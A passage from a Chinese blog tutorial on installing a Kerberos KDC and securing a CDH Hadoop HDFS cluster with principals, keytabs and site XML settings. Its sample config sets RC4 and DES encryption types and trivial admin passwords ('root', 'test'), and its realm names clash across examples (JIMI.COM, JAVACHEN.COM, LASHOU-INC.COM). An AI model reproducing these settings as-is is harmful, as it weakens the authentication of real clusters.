机器:端口</p><p><code>default_domain</code>：代表默认的域名</p><p><code>[appdefaults]</code>：可以设定一些针对特定应用的配置，覆盖默认配置。</p><p>经过一段时间的对比实验，最终配置文件设置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[logging]</span><br><span class="line">     default = FILE:/var/log/krb5libs.log</span><br><span class="line">     kdc = FILE:/var/log/krb5kdc.log</span><br><span class="line">     admin_server = FILE:/var/log/kadmind.log</span><br><span class="line"></span><br><span class="line">[libdefaults]</span><br><span class="line">     dns_lookup_realm = false</span><br><span class="line">     dns_lookup_kdc = false</span><br><span class="line">     ticket_lifetime = 24h</span><br><span class="line">     renew_lifetime = 7d</span><br><span class="line">     forwardable = true</span><br><span class="line">     renewable = true</span><br><span class="line">     udp_preference_limit = 1</span><br><span class="line">     rdns = false</span><br><span class="line">     pkinit_anchors = /etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">     default_realm = JIMI.COM</span><br><span class="line">     default_tgs_enctypes = arcfour-hmac</span><br><span class="line">     default_tkt_enctypes = arcfour-hmac</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    JIMI.COM = &#123;</span><br><span class="line">      kdc = master126</span><br><span class="line">      admin_server = master126</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">     .jimi.com = JIMI.COM</span><br><span class="line">    jimi.com = JIMI.COM</span><br></pre></td></tr></table></figure><p>接下来是第二个配置文件<code>/var/kerberos/krb5kdc/kdc.conf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[kdcdefaults]</span><br><span class="line"> kdc_ports = 88</span><br><span class="line"> kdc_tcp_ports = 88</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line"> JIMI.COM = &#123;</span><br><span class="line">  #master_key_type = aes256-cts</span><br><span class="line">  max_renewable_life= 7d 0h 0m 0s</span><br><span class="line">  acl_file = /var/kerberos/krb5kdc/kadm5.acl</span><br><span class="line">  dict_file = /usr/share/dict/words</span><br><span class="line">  admin_keytab = /var/kerberos/krb5kdc/kadm5.keytab</span><br><span class="line">  supported_enctypes = aes256-cts:normal aes128-cts:normal des3-hmac-sha1:normal arcfour-hmac:normal camellia256-cts:normal camellia128-cts:normal des-hmac-sha1:normal des-cbc-md5:normal des-cbc-crc:normal</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这边直接放上配置文件，官方的配置文件相当冗余，加上版本问题，我删除了很多选项，只留下了小部分，剩下的应该会以默认值运行。</p><p>贴上一点简单的选项说明：</p><p><code>EXAMPLE.COM</code>： 是设定的 <code>realms</code>。名字随意。<code>Kerberos</code> 可以支持多个 <code>realms</code>，会增加复杂度。大小写敏感，一般为了识别使用全部大写。这个 <code>realms</code> 跟机器的 <code>host</code> 没有大关系。</p><p><code>master_key_type</code>：和 <code>supported_enctypes</code> 默认使用 <code>aes256-cts</code>。JAVA 使用 <code>aes256-cts</code> 验证方式需要安装 JCE 包，见下面的说明。为了简便，你可以不使用 <code>aes256-cts</code> 算法，这样就不需要安装 <code>JCE</code> 。</p><p><code>acl_file</code>：标注了 admin 的用户权限，需要用户自己创建。文件格式是：<code>Kerberos_principal permissions</code> [target_principal] [restrictions]</p><p><code>supported_enctypes</code>：支持的校验方式。</p><p>admin_keytab：KDC 进行校验的 keytab。</p><p>这边要注意，如果系统是Centos5.6及以上系统，默认使用AES-256来加密，但是这个AES-256 JDK的安全包里默认不存在，所以要去<a href="https://www.oracle.com/technetwork/cn/java/javase/downloads/jce8-download-2133166-zhs.html" target="_blank" rel="noopener">Oracle</a>下载，但是这个密码增强包貌似对JDK过高的版本支持有BUG，但是暂时好像还没遇到，下载下来之后放到这个目录里：$JAVA_HOME/jre/lib/security</p><p>还有一个文件<code>/var/kerberos/krb5kdc/kadm5.acl</code>：</p><p>这个是权限控制文件，修改为</p><p><a href="mailto:`*/admin@JIMI.COM" target="_blank" rel="noopener">`*/admin@JIMI.COM</a>        *`</p><p>这三个配置文件中只有krb5.conf需要拷贝到集群中其他服务器</p><p>别的两个配置文件不需要分发到别的节点。</p><p><strong>创建数据库</strong>：</p><p>原理里面已经讲过了KDC里面有一个小型的数据库，下面是对这个数据库的操作。</p><p>在master上运行初始化数据库命令，其中 -r 指定对应的realm</p><p><code>kdb5_util create -r JIMI.COM -s</code></p><p>出现 <code>loading random data</code> 的时候另开个终端执行点消耗CPU的命令如<code>cat /dev/sda &gt; /dev/urandom</code> 可以加快随机数采集。该命令会在<code>/var/kerberos/krb5kdc/</code> 目录下创建 <code>principal</code> 数据库。</p><p>如果遇到数据库已经存在的提示，可以把 <code>/var/kerberos/krb5kdc/</code> 目录下的 principal 的相关文件都删除掉。默认的数据库名字都是 <code>principal</code>。可以使用 -d 指定数据库名字。</p><p>这个数据库相当重要，后面还会介绍。</p><p><strong>启动服务</strong>：</p><p>在master节点上运行：</p><p>centos 6：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chkconfig krb5kdc on </span><br><span class="line">chkconfig kadmin on </span><br><span class="line">service krb5kdc start </span><br><span class="line">service kadmin start</span><br></pre></td></tr></table></figure><p>centos 7：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start krb5kdc </span><br><span class="line">systemctl start kadmin </span><br><span class="line">systemctl status krb5kdc </span><br><span class="line">systemctl status kadmin</span><br></pre></td></tr></table></figure><hr><p><strong>创建Kerberos管理员</strong></p><p>Kerberos的管理，有两个方式，分别是kadmin.local 或 kadmin，至于使用哪个，取决于账户和权限访问。</p><ul><li><p>如果有访问 kdc 服务器的 root 权限，但是没有 kerberos admin 账户，使用 kadmin.local</p></li><li><p>如果没有访问 kdc 服务器的 root 权限，但是用 kerberos admin 账户，使用 kadmin</p></li></ul><p>在master上创建远程管理的程序员:</p><p>#手动输入两次密码，这里密码为 root</p><p><code>kadmin.local -q &quot;addprinc root/admin&quot;</code></p><p>#也可以不用手动输入密码</p><p><code>echo -e &quot;root\nroot&quot; | kadmin.local -q &quot;addprinc root/admin&quot;</code></p><p>#或者运行下面命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local &lt;&lt;eoj</span><br><span class="line">addprinc -pw root root/admin</span><br><span class="line">eoj</span><br></pre></td></tr></table></figure><p>系统时提示输入密码，密码不能为空，而且需要妥善保管。</p><p>测试Kerberos：</p><p>查看当前认证用户</p><p>#查看 principals</p><p><code>kadmin: list_principals</code></p><p>#添加一个新的principal</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kadmin:  addprinc user1</span><br><span class="line">WARNING: no policy specified for user1@JIMI.COM; defaulting to no policy</span><br><span class="line">Enter password for principle</span><br><span class="line">Re-enter password for principal &quot;user1@JIMI.COM&quot;:</span><br><span class="line">Principal &quot;user1@JIMI.COM&quot; created.</span><br></pre></td></tr></table></figure><p>#删除 principal</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kadmin:  delprinc user1</span><br><span class="line">Are you sure you want to delete the principal &quot;user1@JIMI.COM&quot;? (yes/no): yes</span><br><span class="line">Principal &quot;user1@JIMI.COM&quot; deleted.</span><br><span class="line">Make sure that you have removed this principal from all ACLs before reusing.</span><br><span class="line">kadmin:exit</span><br></pre></td></tr></table></figure><p>也可以直接通过下面的命令来执行</p><p>#提示需要输入密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin -p root/admin -q &quot;list_principals&quot;</span><br><span class="line">kadmin -p root/admin -q &quot;list_principals&quot;</span><br><span class="line">kadmin -p root/admin -q &quot;addprinc user2&quot;</span><br></pre></td></tr></table></figure><p>#不用输入密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q &quot;list_principals&quot;</span><br><span class="line">kadmin.local -q &quot;addprinc user2&quot;</span><br><span class="line">kadmin.local -q &quot;delprinc user2&quot;</span><br></pre></td></tr></table></figure><p>#创建一个测试用户test，密码设置为test：</p><p><code>echo -e &quot;test\ntest&quot; | kadmin.local -q &quot;addprinc test&quot;</code></p><p>#获取test用户的ticket 通过用户名和密码登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kinit test</span><br><span class="line">Password for test@JIMI.COM</span><br><span class="line">klist -e </span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: test@JIMI.COM</span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">11/07/14 15:29:02  11/08/14 15:29:02  krbtgt/JIMI.COM@JIMI.COM</span><br><span class="line">  renew until 11/17/14 15:29:02, Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br></pre></td></tr></table></figure><p>销毁test用户的ticket</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kdestroy</span><br><span class="line">klist</span><br><span class="line">klist: No credentials cache found (ticket cache FILE:/tmp/krb5cc_0)</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br></pre></td></tr></table></figure><p>更新ticket</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kinit root/admin</span><br><span class="line">Password for root/admin@JIMI.COM</span><br><span class="line">klist</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: root/admin@JIMI.COM</span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">11/07/14 15:33:57  11/08/14 15:33:57  krbtgt/JIMI.COM@JIMI.COM</span><br><span class="line">renew until 11/17/14 15:33:57</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br><span class="line">kinit -R</span><br><span class="line">klist</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: root/admin@JIMI.COM</span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">11/07/14 15:34:05  11/08/14 15:34:05  krbtgt/JIMI.COM@JIMI.COM</span><br><span class="line">renew until 11/17/14 15:33:57</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br></pre></td></tr></table></figure><p>抽取密钥并将其储存在本地 keytab 文件 /etc/krb5.keytab 中。这个文件由超级用户拥有，所以您必须是 root 用户才能在 kadmin shell 中执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q &quot;ktadd kadmin/admin&quot;</span><br><span class="line">klist -k /etc/krb5.keytab</span><br><span class="line">Keytab name: FILE:/etc/krb5.keytab</span><br><span class="line">KVNO Principal</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br></pre></td></tr></table></figure><p>HDFS上配置kerberos</p><p>创建认证规则</p><p>在 <code>Kerberos</code> 安全机制里，一个 <code>principal</code> 就是 <code>realm</code> 里的一个对象，一个 <code>principal</code> 总是和一个密钥（<code>secret key</code>）成对出现的。</p><p>这个 <code>principal</code> 的对应物可以是 <code>service</code>，可以是 <code>host</code>，也可以是 <code>user</code>，对于 <code>Kerberos</code> 来说，都没有区别。</p><p><code>Kdc(Key distribute center)</code> 知道所有 <code>principal</code> 的 <code>secret key</code>，但每个 <code>principal</code> 对应的对象只知道自己的那个 <code>secret key</code> 。这也是“共享密钥“的由来。</p><p>对于 <code>hadoop</code>，<code>principals</code> 的格式为</p><p><a href="mailto:`username/fully.qualified.domain.name@YOUR-REALM.COM" target="_blank" rel="noopener">`username/fully.qualified.domain.name@YOUR-REALM.COM</a>`</p><p>通过 <code>yum</code> 源安装的 <code>cdh</code> 集群中，NameNode和 DataNode 是通过 hdfs 启动的，故为集群中每个服务器节点添加两个<code>principals：hdfs</code>、HTTP。</p><p>在 KCD server 上（这里是 cdh1）创建 hdfs principal：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q "addprinc -randkey hdfs/datanode0@JIMI.COM"</span><br><span class="line">kadmin.local -q "addprinc -randkey hdfs/datanode1@JIMI.COM"</span><br><span class="line">kadmin.local -q "addprinc -randkey hdfs/master@JIMI.COM"</span><br></pre></td></tr></table></figure><p>-randkey<br>标志没有为新 <code>principal</code> 设置密码，而是指示 <code>kadmin</code> 生成一个随机密钥。之所以在这里使用这个标志，是因为此 <code>principal</code> 不需要用户交互。它是计算机的一个服务器账户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q "addprinc -randkey HTTP/ datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey HTTP/ datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey HTTP/ master@JIMI.COM "</span><br></pre></td></tr></table></figure><p>创建完成后，查看：</p><p><code>kadmin.local -q &quot;listprincs&quot;</code></p><p>手动创建keytab文件</p><p><code>keytab</code>是包含 <code>principals</code> 和加密 <code>principal key</code> 的文件。<code>keytab</code> 文件对于每个 <code>host</code>是唯一的，因为 <code>key</code> 中包含 <code>hostname</code>。<code>keytab</code>文件用于不需要人工交互和保存纯文本密码，实现到 <code>kerberos</code> 上验证一个主机上的 <code>principal</code>。因为服务器上可以访问 <code>keytab</code> 文件即可以以 <code>principal</code> 的身份通过 <code>kerberos</code> 的认证，所以，<code>keytab</code> 文件应该被妥善保存，应该只有少数的用户可以访问。</p><p>创建包含 hdfs principal 和 host principal 的 hdfs keytab：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xst -norandkey -k hdfs.keytab hdfs/fully.qualified.domain.name host/fully.qualified.domain.name</span><br></pre></td></tr></table></figure><p>创建包含 mapred principal 和 host principal 的 mapred keytab：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xst -norandkey -k mapred.keytab mapred/fully.qualified.domain.name host/fully.qualified.domain.name</span><br></pre></td></tr></table></figure><p>注意：上面的方法使用了xst的norandkey参数，有些kerberos不支持该参数。<br>当不支持该参数时有这样的提示：<code>Principal -norandkey does not exist</code>.，需要使用下面的方法来生成keytab文件:</p><p>在master节点，即KDC server节点上执行下面的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /var/kerberos/krb5kdc/</span><br><span class="line">kadmin.local -q "xst  -k hdfs-unmerged.keytab  hdfs/datanode0@JIMI.COM"</span><br><span class="line">kadmin.local -q "xst  -k hdfs-unmerged.keytab  hdfs/datanode1@JIMI.COM"</span><br><span class="line">kadmin.local -q "xst  -k hdfs-unmerged.keytab  hdfs/master@JIMI.COM"</span><br><span class="line">----------------------------------------------------------------------------------</span><br><span class="line">kadmin.local -q "xst  -k HTTP.keytab  HTTP/ datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k HTTP.keytab  HTTP/ datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k HTTP.keytab  HTTP/ master@JIMI.COM "</span><br></pre></td></tr></table></figure><p>这样，就会在 /var/kerberos/krb5kdc/ 目录下生成hdfs-unmerged.keytab 和 HTTP.keytab 两个文件，接下来使用 ktutil 合并者两个文件为 hdfs.keytab。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /var/kerberos/krb5kdc/</span><br><span class="line">ktutil</span><br><span class="line">ktutil: rkt hdfs-unmerged.keytab</span><br><span class="line">ktutil: rkt HTTP.keytab</span><br><span class="line">ktutil: wkt hdfs.keytab</span><br><span class="line">ktutil: exit</span><br></pre></td></tr></table></figure><p>使用 klist 即可查看 hdfs.keytab 文件列表：（省略）</p><p>验证是否正确合并了key，使用合并后的keytab，分别使用hdfs和host principals来获取证书。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kinit -k -t hdfs.keytab hdfs/master@JIMI.COM</span><br><span class="line">kinit -k -t hdfs.keytab HTTP/master@JIMI.COM</span><br></pre></td></tr></table></figure><p>如果出现错误：<code>kinit: Key table entry not found while getting initial credentials</code>，则上面的合并有问题，重新执行前面的操作。</p><p>部署kerberos keytab文件</p><p>拷贝 hdfs.keytab 文件到其他节点的 /etc/hadoop/conf 目录</p><p>并设置权限，分别在三个节点上运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown hdfs:hadoop /etc/hadoop/conf/hdfs.keytab</span><br><span class="line">chmod 400 /etc/hadoop/conf/hdfs.keytab</span><br></pre></td></tr></table></figure><p>原因：</p><p>由于 keytab 相当于有了永久凭证，不需要提供密码(如果修改<code>kdc</code>中的<code>principal</code>的密码，则该<code>keytab</code>就会失效)，所以其他用户如果对该文件有读权限，就可以冒充 <code>keytab</code> 中指定的用户身份访问 <code>hadoop</code>，所以 <code>keytab</code> 文件需要确保只对 <code>owner</code> 有读权限(0400)</p><p>修改hdfs配置文件，先停止集群</p><p>在集群总所有节点的<code>core-site.xml</code>文件中添加下面的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hadoop.security.authentication&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;kerberos&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hadoop.security.authorization&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>在集群总所有节点的<code>hdfs-site.xml</code>文件中添加下面的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.block.access.token.enable&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;  </span><br><span class="line">  &lt;name&gt;dfs.datanode.data.dir.perm&lt;/name&gt;  </span><br><span class="line">  &lt;value&gt;700&lt;/value&gt;  </span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.namenode.keytab.file&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.namenode.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.namenode.kerberos.https.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.address&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;0.0.0.0:1004&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.http.address&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;0.0.0.0:1006&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.keytab.file&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.kerberos.https.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>如果想开启 SSL，请添加（本文不对这部分做说明）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.http.policy&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTPS_ONLY&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>如果 HDFS 配置了 QJM HA，则需要添加（另外，你还要在 zookeeper 上配置 kerberos）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.journalnode.keytab.file&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.journalnode.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.journalnode.kerberos.internal.spnego.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>如果配置了WebHDFS，则添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.web.authentication.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.web.authentication.kerberos.keytab&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>配置中需要注意的点：</p><p>1.<code>dfs.datanode.address</code>表示<code>data transceiver RPC server</code>所绑定的<code>hostname</code>或IP地址，如果开启 security，端口号必须小于 1024(privileged port)，否则的话启动 datanode 时候会报 <code>Cannot start secure cluster without privileged resources</code> 错误。</p><p>2.<code>principal</code> 中的 <code>instance</code> 部分可以使用 _HOST 标记，系统会自动替换它为全称域名。</p><p>3.如果开启了 <code>security, hadoop</code> 会对 <code>hdfs block data</code>(由 dfs.data.dir 指定)做 <code>permission check</code>，方式用户的代码不是调用<code>hdfs api</code>而是直接本地读<code>block data</code>，这样就绕过了<code>kerberos</code>和文件权限验证，管理员可以通过设置 <code>dfs.datanode.data.dir.perm</code> 来修改 <code>datanode</code> 文件权限，这里我们设置为700</p><p>CDH的权限管理（<a href="https://www.cloudera.com/documentation/enterprise/6/latest/topics/cm_sg_s1_install_cm_cdh.html" target="_blank" rel="noopener">来自cloudera官网</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hdfs：NameNode, DataNodes, and Secondary NameNode</span><br><span class="line">mapred：JobTracker and TaskTrackers (MR1) and Job History Server (YARN)</span><br><span class="line">yarn：ResourceManager and NodeManagers (YARN)</span><br><span class="line">oozie：Oozie Server</span><br><span class="line">hue：Hue Server, Beeswax Server, Authorization Manager, and Job Designer</span><br></pre></td></tr></table></figure><p>目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 